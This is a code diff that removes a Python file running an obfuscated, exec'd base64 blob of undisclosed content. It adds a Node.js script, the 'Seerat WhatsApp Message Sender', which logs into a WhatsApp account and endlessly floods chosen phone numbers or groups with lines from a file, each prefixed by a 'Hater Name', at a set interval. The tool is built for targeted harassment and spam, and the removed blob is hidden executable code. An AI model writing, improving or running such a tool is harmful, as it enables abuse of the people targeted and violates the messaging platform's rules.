@@ -1,6 +1,157 @@
-# ENCODE : TRICK BY SEERAT RULEX BRAND 
-# Obfuscated with PyObfuscate
-# # GITHUB : # https://github.com/trickbyanaysa
-## YOUTUBE : https://www.youtube.com/@Trick-by-rulex-seerat-brand
-# -------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+(async () => {
+  try {
+    const { makeWASocket, useMultiFileAuthState, delay, DisconnectReason } = await import("@whiskeysockets/baileys");
+    const fs = await import('fs');
+    const pino = (await import('pino')).default;
+    const rl = (await import("readline")).createInterface({ input: process.stdin, output: process.stdout });
+    
+    const question = (text) => new Promise((resolve) => rl.question(text, resolve));
+
+    const reset = "\x1b[0m"; 
+    const green = "\x1b[1;32m"; 
+    const yellow = "\x1b[1;33m"; 
+
+    const logo = `${yellow}
+ _____ ______ ______ _____         _______
+  / ____|  ____|  ____|  __ \     /\|__   __|
+ | (___ | |__  | |__  | |__) |   /  \  | |
+  \___ \|  __| |  __| |  _  /   / /\ \ | |
+  ____) | |____| |____| | \ \  / ____ \| |
+ |_____/|______|______|_|  \_\/_/    \_\_|
+============================================
+[~] Author  : TRICKER SEERAT BRAND 
+[~] GitHub  : CRIMINAL SEERAT 
+[~] Tool  : Seerat WhatsApp Message Sender
+============================================`;
+
+    const clearScreen = () => {
+      console.clear();
+      console.log(logo);
+    };
+
+    let targetNumbers = [];
+    let groupUIDs = [];
+    let messages = null;
+    let intervalTime = null;
+    let haterName = null;
+    let lastSentIndex = 0;
+
+    const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
+
+    async function sendMessages(MznKing) {
+      while (true) {
+        for (let i = lastSentIndex; i < messages.length; i++) {
+          try {
+            const currentTime = new Date().toLocaleTimeString();
+            const fullMessage = `${haterName} ${messages[i]}`;
+
+            if (targetNumbers.length > 0) {
+              for (const targetNumber of targetNumbers) {
+                await MznKing.sendMessage(targetNumber + '@c.us', { text: fullMessage });
+                console.log(`${orange}Target Number => ${reset}${targetNumber}`);
+              }
+            } else {
+              for (const groupUID of groupUIDs) {
+                await MznKing.sendMessage(groupUID + '@g.us', { text: fullMessage });
+                console.log(`${yellow}Group UID => ${reset}${groupUID}`);
+              }
+            }
+
+            console.log(`${yellow}Time => ${reset}${currentTime}`);
+            console.log(`${yellow}Message => ${reset}${fullMessage}`);
+            console.log('    [ S33R9T BRAND  ]');
+            await delay(intervalTime * 1000);
+          } catch (sendError) {
+            console.log(`${yellow}Error sending message: ${sendError.message}. Retrying...${reset}`);
+            lastSentIndex = i;
+            await delay(5000); 
+          }
+        }
+        lastSentIndex = 0; 
+      }
+    }
+
+    const connectToWhatsApp = async () => {
+      const MznKing = makeWASocket({
+        logger: pino({ level: 'silent' }),
+        auth: state, 
+      });
+
+      if (!MznKing.authState.creds.registered) {
+        clearScreen(); 
+        const phoneNumber = await question(`${yellow}[+] Enter Your Phone Number => ${reset}`);
+        const pairingCode = await MznKing.requestPairingCode(phoneNumber); 
+        clearScreen();
+        console.log(`${yellow}[√] Your Pairing Code Is => ${reset}${pairingCode}`);
+      }
+
+      MznKing.ev.on("connection.update", async (s) => {
+        const { connection, lastDisconnect } = s;
+
+        if (connection === "open") {
+          clearScreen(); 
+          console.log(`${yellow}[Your WhatsApp Login ✓]${reset}`);
+
+          const sendOption = await question(`${yellow}[1] Send to Target Number\n[2] Send to WhatsApp Group\nChoose Option => ${reset}`);
+
+          if (sendOption === '1') {
+            const numberOfTargets = await question(`${yellow}[+] How Many Target Numbers? => ${reset}`);
+            for (let i = 0; i < numberOfTargets; i++) {
+              const targetNumber = await question(`${yellow}[+] Enter Target Number ${i + 1} => ${reset}`);
+              targetNumbers.push(targetNumber); 
+            }
+          } else if (sendOption === '2') {
+            const groupList = await MznKing.groupFetchAllParticipating();
+            const groupUIDsList = Object.keys(groupList);
+            console.log(`${yellow}[√] WhatsApp Groups =>${reset}`);
+            groupUIDsList.forEach((uid, index) => {
+              console.log(`${yellow}[${index + 1}] Group Name: ${reset}${groupList[uid].subject} ${green}UID: ${reset}${uid}`);
+            });
+
+            const numberOfGroups = await question(`${yellow}[+] How Many Groups to Target => ${reset}`);
+            for (let i = 0; i < numberOfGroups; i++) {
+              const groupUID = await question(`${yellow}[+] Enter Group UID ${i + 1} => ${reset}`);
+              groupUIDs.push(groupUID); 
+            }
+          }
+
+          const messageFilePath = await question(`${green}[+] Enter Message File Path => ${reset}`);
+          messages = fs.readFileSync(messageFilePath, 'utf-8').split('\n').filter(Boolean);
+          haterName = await question(`${yellow}[+] Enter Hater Name => ${reset}`);
+          intervalTime = await question(`${yellow}[+] Enter Message Delay => ${reset}`);
+
+          console.log(`${yellow}All Details Are Filled Correctly${reset}`);
+          clearScreen(); 
+          console.log(`${yellow}Now Start Message Sending.......${reset}`);
+          console.log('      [ S33R9T BRAND ]');
+          console.log('');
+
+          await sendMessages(MznKing);
+        }
+
+        if (connection === "close" && lastDisconnect?.error) {
+          const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
+          if (shouldReconnect) {
+            console.log("Network issue, retrying in 5 seconds...");
+            setTimeout(connectToWhatsApp, 5000); 
+          } else {
+            console.log("Connection closed. Please restart the script.");
+          }
+        }
+      });
+
+      MznKing.ev.on('creds.update', saveCreds);
+    };
+
+    await connectToWhatsApp();
+
+    process.on('uncaughtException', function (err) {
+      let e = String(err);
+      if (e.includes("Socket connection timeout") || e.includes("rate-overlimit")) return;
+      console.log('Caught exception: ', err);
+    });
+
+  } catch (error) {
+    console.error("Error importing modules:", error);
+  }
+})();
